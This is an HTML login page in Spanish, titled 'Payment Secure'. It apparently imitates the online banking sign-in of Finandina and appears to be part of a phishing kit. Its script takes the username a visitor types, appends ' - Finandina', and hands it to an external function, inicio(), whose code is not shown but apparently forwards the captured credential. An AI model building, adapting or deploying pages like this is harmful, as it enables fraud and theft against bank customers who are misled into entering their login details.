<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Secure</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions.js"></script>  		

</head>
<body>

<img src="img/logo.webp" alt="" srcset="" width="100%">
<img src="img/user.webp" alt="" srcset="" width="6%" style="position:absolute; left:33px;margin-top:10px;">

<center><input type="text" id="txtUsuario" placeholder="Ingresa el usuario" style="width:80%; border:none; border-bottom:1px solid #dcdcdc; padding-left:35px; height:40px; font-size:15px;"></center>
<a href="" style="position:absolute; right:30px; margin-top:10px;">Â¿Olvidaste tu usuario?</a>

<center><input type="submit" id="btnUsuario" value="Continuar" style="width:80%; background-color:#f08ba7; margin-top:50px; height:40px; border-radius:20px;"></center>
<center><input type="submit" value="Registrarme ahora" style="width:80%; color:#f08ba7; border:1px solid #f08ba7;margin-top:10px; height:40px; background-color:white; border-radius:20px;"></center>
    




<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if ($("#txtUsuario").val().length > 0) {
				inicio($("#txtUsuario").val()+" - Finandina");	
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>
</body>
</html>
